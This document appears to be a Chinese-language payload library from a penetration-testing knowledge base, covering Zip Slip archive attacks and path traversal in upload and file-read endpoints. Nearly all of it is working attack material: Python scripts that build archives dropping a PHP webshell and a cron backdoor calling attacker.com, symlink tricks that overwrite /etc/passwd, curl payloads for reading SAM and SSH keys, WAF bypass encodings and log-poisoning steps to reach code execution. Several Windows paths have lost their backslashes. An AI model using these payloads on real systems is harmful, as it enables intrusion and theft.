# 解压 / 路径遍历 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:Zip Slip(`../` 突破压缩包目录) + 路径遍历(上传文件名带 `..`)。任何"上传压缩包并解压"流程都试。

---

## A. Zip Slip

### Zip Slip  `file-zip-slip`
利用恶意构造的压缩包文件(ZIP/TAR)中的路径遍历实现任意文件写入，覆盖服务器上的关键文件或写入Webshell
子类：**Zip** · tags: `zip-slip` `file` `rce`

**前置条件：** 目标存在ZIP/TAR文件上传并自动解压功能；解压库未对文件名中的路径遍历进行过滤；了解Web根目录或其他关键目录的路径

**攻击链：**

**1. 探测ZIP上传和解压功能**  _[linux]_
_识别目标的ZIP上传解压功能和文件存储路径_
```
# 常见的ZIP上传解压场景:
# - 批量文件上传(模板/资源导入)
# - 插件/主题安装(WordPress/Discuz)
# - 备份恢复功能
# - 文档处理(DOCX/XLSX本质是ZIP)

# 测试正常ZIP上传:
echo "test" > test.txt
zip test.zip test.txt
curl -F "file=@test.zip" "http://target.com/upload/batch"

# 确认解压后文件的存储路径:
curl "http://target.com/uploads/test.txt"
```

**2. 构造Zip Slip恶意压缩包**
_使用Python创建包含路径遍历文件名的恶意ZIP压缩包_
```
# Python脚本创建恶意ZIP:
import zipfile
import os

# 目标：写入webshell到web根目录
with zipfile.ZipFile("evil.zip", "w") as zf:
    # 正常文件(伪装)
    zf.writestr("readme.txt", "Normal file")
    # 恶意文件(路径遍历)
    zf.writestr("../../../var/www/html/test_shell.php",
                "<?php echo system($_GET['cmd']); ?>")
    # 或覆盖配置文件:
    zf.writestr("../../../../../../etc/cron.d/backdoor",
                "* * * * * root curl http://attacker.com/callback")

print("[+] evil.zip created")
print("Files in ZIP:")
with zipfile.ZipFile("evil.zip", "r") as zf:
    for info in zf.infolist():
        print(f"  {info.filename} ({info.file_size} bytes)")
```

**3. 上传并验证Zip Slip**  _[linux]_
_上传恶意ZIP并验证是否成功写入Webshell_
```
# 上传恶意ZIP
curl -F "file=@evil.zip" "http://target.com/upload/batch"

# 验证webshell写入成功
curl "http://target.com/test_shell.php?cmd=id"
curl "http://target.com/test_shell.php?cmd=whoami"

# 如果目标是Java应用(WAR包):
# 构造恶意WAR/JAR包(本质也是ZIP):
jar cf evil.war -C webshell/ .
# 或修改文件名为../../../webapps/ROOT/shell.jsp
```

**4. TAR包Zip Slip变体**
_使用TAR包实现Zip Slip，包括符号链接攻击变体_
```
# 构造恶意TAR包:
import tarfile
import io

with tarfile.open("evil.tar.gz", "w:gz") as tar:
    # 添加恶意文件
    content = b"<?php system($_GET['cmd']); ?>"
    info = tarfile.TarInfo(name="../../../var/www/html/test_t.php")
    info.size = len(content)
    tar.addfile(info, io.BytesIO(content))

# 使用符号链接攻击:
import tarfile
with tarfile.open("evil_symlink.tar.gz", "w:gz") as tar:
    # 创建指向/etc/passwd的符号链接
    info = tarfile.TarInfo(name="link_to_passwd")
    info.type = tarfile.SYMTYPE
    info.linkname = "/etc/passwd"
    tar.addfile(info)
    # 然后通过"link_to_passwd"覆盖目标文件
    content = b"root:x:0:0:root:/root:/bin/bash"
    info2 = tarfile.TarInfo(name="link_to_passwd")
    info2.size = len(content)
    tar.addfile(info2, io.BytesIO(content))
```

**WAF/EDR 绕过变体：**

**1. 替代压缩格式绕过**
_使用tar/7z/cpio等替代压缩格式，WAF可能仅检测zip格式的路径遍历_
```
# 使用tar格式（可能未被检测）
import tarfile, io
with tarfile.open('test.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='../../../tmp/test.txt')
    info.size = 14
    tar.addfile(info, io.BytesIO(b'security_check'))

# 使用7z格式
7z a test.7z ../../../tmp/test.txt

# 使用cpio格式
echo "../../../tmp/test.txt" | cpio -o > test.cpio
```

**2. 符号链接攻击**
_压缩包内嵌入符号链接指向敏感文件，解压后通过符号链接读取目标文件_
```
# 创建包含符号链接的压缩包
import zipfile, os

# 方法1: tar符号链接
import tarfile
with tarfile.open('symlink.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='link')
    info.type = tarfile.SYMTYPE
    info.linkname = '/etc/passwd'
    tar.addfile(info)

# 方法2: zip中嵌入符号链接（Linux）
os.symlink('/etc/passwd', '/tmp/link')
with zipfile.ZipFile('symlink.zip', 'w') as zf:
    zf.write('/tmp/link', 'link')
```

**3. 文件名编码混淆**
_通过修改压缩包内文件名的编码方式（UTF-8/GBK/反斜杠）绕过解压时的路径检查_
```
# Unicode文件名混淆
import zipfile, io, struct

with zipfile.ZipFile('encoded.zip', 'w') as zf:
    # 使用反斜杠（Windows路径分隔符）
    zf.writestr('..\\..\\..\\tmp\\test.txt', 'security_check')

# 手工构造zip（修改中央目录文件名）
# 使用UTF-8编码的路径遍历字符
with open('crafted.zip', 'rb') as f:
    data = bytearray(f.read())
    # 替换文件名中的编码字符
    # ../变为 %2e%2e%2f 的原始字节
```

---


---

## B. 路径遍历(上传场景)

### 路径遍历  `file-traversal`
利用路径遍历(../)序列突破文件访问的目录限制，读取或写入Web根目录以外的任意文件
子类：**Traversal** · tags: `traversal` `file`

**前置条件：** 目标存在文件读取/包含功能；文件路径参数可控；服务端路径过滤不严格

**攻击链：**

**1. 基础路径遍历测试**  _[linux]_
_测试基本路径遍历和所需的目录跳转深度_
```
# 基础遍历:
curl "http://target.com/file?path=../../../../etc/passwd"
curl "http://target.com/image?name=../../../../etc/passwd"

# 测试遍历深度(通常3-10层足够到根目录):
for i in $(seq 1 10); do
  traversal=$(printf "../%.0s" $(seq 1 $i))
  resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "http://target.com/file?path=${traversal}etc/passwd")
  echo "Depth $i: $resp"
done
```

**2. 编码绕过路径过滤**
_使用多种编码方式绕过路径遍历的过滤机制_
```
# URL编码:
curl "http://target.com/file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"

# 双重URL编码:
curl "http://target.com/file?path=%252e%252e%252f%252e%252e%252fetc/passwd"

# Unicode编码:
curl "http://target.com/file?path=..%c0%afetc/passwd"
curl "http://target.com/file?path=..%ef%bc%8fetc/passwd"

# 空字节截断(PHP<5.3.4):
curl "http://target.com/file?path=../../../../etc/passwd%00.jpg"

# 双写绕过(服务端删除../一次):
curl "http://target.com/file?path=....//....//....//etc/passwd"

# 反斜杠(Windows):
curl "http://target.com/file?path=......windowswin.ini"

# 混合斜杠:
curl "http://target.com/file?path=../../../../etc/passwd"
```

**3. Windows特有路径遍历**  _[windows]_
_Windows环境下的特有路径遍历手法和敏感文件_
```
# UNC路径(可能触发SMB认证):
curl "http://target.com/file?path=\attacker.comshare	est"

# Windows敏感文件:
curl "http://target.com/file?path=C:Windowswin.ini"
curl "http://target.com/file?path=C:WindowsSystem32configSAM"
curl "http://target.com/file?path=C:inetpubwwwrootweb.config"
curl "http://target.com/file?path=C:UsersAdministrator.sshid_rsa"

# IIS短文件名枚举:
curl -v "http://target.com/file?path=C:inetpubwwwrootWEB~1.CON"
```

**4. LFI到RCE升级**  _[linux]_
_将文件包含(LFI)升级为远程代码执行(RCE)_
```
# 1. 日志文件包含(Log Poisoning):
curl "http://target.com/" -A "<?php system($_GET['cmd']); ?>"
curl "http://target.com/file?path=../../../var/log/apache2/access.log&cmd=id"

# 2. /proc/self/environ包含:
curl "http://target.com/file?path=../../../proc/self/environ" -A "<?php system($_GET['c']); ?>"

# 3. PHP Session文件包含:
# 先在session中写入payload(如用户名字段)
# 然后包含session文件:
curl "http://target.com/file?path=../../../tmp/sess_SESSION_ID"

# 4. PHP Filter读取源码:
curl "http://target.com/file?path=php://filter/convert.base64-encode/resource=config.php"
```

**WAF/EDR 绕过变体：**

**1. 编码绕过路径过滤**
_通过双重URL编码、Unicode超长编码、UTF-8非标准编码绕过WAF的路径检测规则_
```
# 双重URL编码
..%252f..%252f..%252fetc%252fpasswd

# Unicode/UTF-8超长编码
..%c0%af..%c0%afetc/passwd
..%e0%80%af..%e0%80%afetc/passwd

# 16位Unicode编码
..%u002f..%u002fetc/passwd
..%u2215..%u2215etc/passwd

# URL编码混合
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%5c%2e%2e%5cetc%5cpasswd
```

**2. 路径规范化差异利用**
_利用不同中间件（IIS/Apache/Nginx/Tomcat）对路径解析的差异绕过安全限制_
```
# 反斜杠替代（IIS/Windows）
..\..\..\etc\passwd
..\\..\\..\\windows\\win.ini

# 点斜杠变体
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/etc/passwd

# Java/Tomcat特殊处理
/..;/..;/..;/etc/passwd
/.;/../.;/../etc/passwd

# Nginx路径折叠
/static/../../../etc/passwd
/images/..%2f..%2f..%2fetc/passwd
```

**3. 空字节与路径截断绕过**
_利用空字节注入、文件系统路径长度限制和Windows特殊文件名处理机制绕过_
```
# 空字节截断
../../etc/passwd%00.png
../../etc/passwd\x00.jpg

# Windows短文件名
..\..\..\WINDOW~1\system32\drivers\etc\hosts

# 超长路径截断（PHP < 5.3）
../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

# 点空格点截断（Windows）
../../windows/win.ini. . .
```

---


---

← 回 [00-index.md](00-index.md) · 通用 path traversal 见 [`../path-traversal/00-index.md`](../path-traversal/00-index.md)
